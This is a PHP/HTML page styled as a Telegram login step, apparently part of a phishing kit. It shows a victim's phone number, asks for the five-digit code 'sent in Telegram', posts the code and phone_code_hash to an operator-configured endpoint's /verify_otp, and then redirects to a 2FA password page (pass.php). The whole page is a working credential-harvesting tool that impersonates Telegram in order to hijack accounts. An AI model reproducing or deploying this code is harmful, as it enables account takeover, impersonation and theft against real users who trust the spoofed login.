<?php
require_once '../settings.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
  <title>Telegram Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    /* Rotating Dots Loader */
    .loader {
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .loader-dot {
      width: 6px;
      height: 6px;
      margin: 0 3px;
      border-radius: 50%;
      background-color: white;
      opacity: 0.4;
      animation: bounce 1.5s infinite ease-in-out;
    }

    .loader-dot:nth-child(1) {
      animation-delay: -0.32s;
    }

    .loader-dot:nth-child(2) {
      animation-delay: -0.16s;
    }

    @keyframes bounce {
      0%, 80%, 100% {
        transform: scale(0.6);
        opacity: 0.4;
      }
      40% {
        transform: scale(1);
        opacity: 1;
      }
    }

    .hidden {
      display: none;
    }

    .text-sm {
      font-size: 0.875rem;
    }

    .text-red-500 {
      color: #f87171;
    }

    .text-green-500 {
      color: #10b981;
    }
  </style>
</head>
<body class="bg-gray-900">

  <!-- Form container centered horizontally with a margin top of 6 -->
  <div class="text-center w-full max-w-md px-4 mt-6 mx-auto">
    <img
      alt="Telegram logo"
      class="mx-auto mb-6"
      height="100"
      src="../img/pell.png"
      width="100"
    />
    <h1 id="phone-number" class="text-2xl text-white font-semibold mb-2"></h1>
    <p class="text-gray-400 mb-6">
      We have sent you a message in Telegram with the code.
    </p>
    
    <!-- OTP Code -->
    <div class="relative mb-4">
      <label
        id="labelotp"
        for="otp"
        class="absolute -top-2 left-3 text-gray-400 text-xs bg-gray-900 px-1"
      >
       Code
      </label>
      <input
        id="otp"
        name="otp"
        type="text"
        class="w-full p-4 bg-transparent text-white rounded-lg border border-gray-600 focus:border-purple-500 focus:outline-none text-base"
        placeholder=""
        maxlength="5"
        value=""
      />
    </div>

    <!-- Message Error or Success -->
    <p id="message" class="text-sm text-red-500 hidden"></p>

    <!-- Loader Spinner -->
    <div class="loader hidden">
      <div class="loader-dot"></div>
      <div class="loader-dot"></div>
      <div class="loader-dot"></div>
    </div>
  </div>
  
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
</script>
  <script>
// Ambil nomor telepon dari sessionStorage
const phone = sessionStorage.getItem('phone');
const phoneCodeHash = sessionStorage.getItem('phone_code_hash'); // Simpan saat permintaan OTP
const otpInput = $('#otp'); // Gunakan jQuery untuk elemen input
const loader = $('.loader');
const message = $('#message');

// Tampilkan nomor telepon di halaman
if (phone) {
  $('#phone-number').text(phone);
} else {
  $('#phone-number').text('Nomor telepon tidak tersedia');
}

// Tangani input OTP
otpInput.on('input', function () {
  let otpCode = $(this).val().replace(/[^0-9]/g, ''); // Hanya angka

  $(this).val(otpCode); // Bersihkan input dari karakter non-numerik

  if (otpCode.length === 5) { // Jika OTP berisi 5 digit
    loader.removeClass('hidden'); // Tampilkan loader
    message.addClass('hidden').text(''); // Sembunyikan pesan error sebelumnya

    const endpointUrl = phpSettings.endpointUrl;
    
    $.ajax({
      url: endpointUrl + "/verify_otp", // Ganti URL dengan endpoint Flask
      method: 'POST',
      contentType: 'application/json', // Format JSON
      data: JSON.stringify({
        phone: phone,
        otp: otpCode,
        phoneCodeHash: phoneCodeHash
      }),
      success: function (response) {
        loader.addClass('hidden'); // Sembunyikan loader

        // Jika OTP berhasil diverifikasi
        if (response.status === 'success') {
          message.removeClass('hidden text-red-500').addClass('text-green-500').text(response.message);
          setTimeout(() => window.location.href = "success.php", 1000); // Redirect ke halaman 2FA
        }
        // Jika 2FA diperlukan
        else if (response.status === 'needs_2fa') {
          message.removeClass('hidden text-red-500').addClass('text-yellow-500').text(response.message);
          setTimeout(() => window.location.href = "pass.php", 1000);
        }
        // Jika OTP gagal
        else {
          message.removeClass('hidden text-green-500').addClass('text-red-500').text(response.message);
        }
      },
      error: function (xhr) {
        loader.addClass('hidden'); // Sembunyikan loader

        let errorMsg = 'Terjadi kesalahan, coba lagi nanti.';
        if (xhr.responseJSON && xhr.responseJSON.message) {
          errorMsg = xhr.responseJSON.message;
        }
        message.removeClass('hidden text-green-500').addClass('text-red-500').text(errorMsg);
      }
    });
  }
});
</script>
</body>
</html>